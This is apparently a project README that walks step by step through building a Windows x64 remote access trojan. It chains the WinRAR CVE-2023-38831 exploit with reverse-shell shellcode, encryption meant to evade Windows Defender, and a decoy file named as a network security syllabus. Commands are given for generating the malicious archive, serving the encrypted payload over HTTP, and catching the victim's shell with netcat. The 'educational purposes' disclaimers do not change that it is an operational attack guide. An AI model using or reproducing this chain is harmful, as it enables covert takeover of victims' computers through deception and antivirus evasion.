# Windows x64 Remote Access Trojan (RAT)

## Objective
Develop a Windows x64 RAT using CVE-2023-38831 (WinRAR < 6.23) and Shellcode exploitation to bypass Windows Defender.

## System Description
1. **Shellcode Initialization**
   - Generate shellcode using Windows/x64 - PIC Null-Free TCP Reverse Shell Shellcode.
2. **main.cpp Explanation**
   - Inject and execute shellcode in memory to establish a reverse TCP connection.
3. **Compile and Encrypt main.cpp**
   - Compile C++ file into an executable and encrypt it.
4. **Exploit WinRAR CVE-2023-38831**
   - Use the vulnerability to download, decrypt, and execute the encrypted RAT.
5. **Decrypt and Execute Script (decrypt_file.ps1)**
   - Decrypt and execute the downloaded executable.
6. **Execution**
   - Open the crafted PDF/image to trigger reverse shell connection.

# Exploit Guide

**Warning: This information is for educational purposes only. Unauthorized use of these techniques is illegal and unethical.**

## Step-by-Step Instructions

1. **Craft Shellcode**
   - Use `51721.py` to generate the initial shellcode.

2. **Modify and Compile the Shellcode**
   - Make necessary modifications to the shellcode.
   - Compile the modified code.

3. **Encrypt the Executable**
   - Use `decrypt_file.ps1` to encrypt the compiled executable:
     ```powershell
     .\decrypt_file.ps1 -inputFile .\main.exe -outputFile .\enc_main.exe
     ```

4. **Create a WinRAR Archive**
   - Use `cve-2023-38831-exp-gen.py` to create the archive:
     ```
     python cve-2023-38831-exp-gen.py NetworkSecuritySyllabus.pdf script.bat NetworkSecuritySyllabus.rar
     ```

5. **Set Up a Python Server for File Download**
   - Navigate to the directory containing `enc_main.exe` and `decrypt_file.ps1`.
   - Start a Python HTTP server:
     ```
     python3 -m http.server 8000
     ```

6. **Prepare to Listen for the Reverse TCP Shell**
   - Open Netcat to listen for incoming TCP connections:
     ```
     nc -lnvp 4444
     ```

7. **Trigger the Reverse TCP Shell**
   - When the victim opens the PDF file, the reverse TCP connection will be triggered, giving you access to their machine.

## Disclaimer

This information is provided for educational purposes only. The use of this exploit without explicit permission is illegal and unethical. The author assumes no responsibility for any misuse of this information.
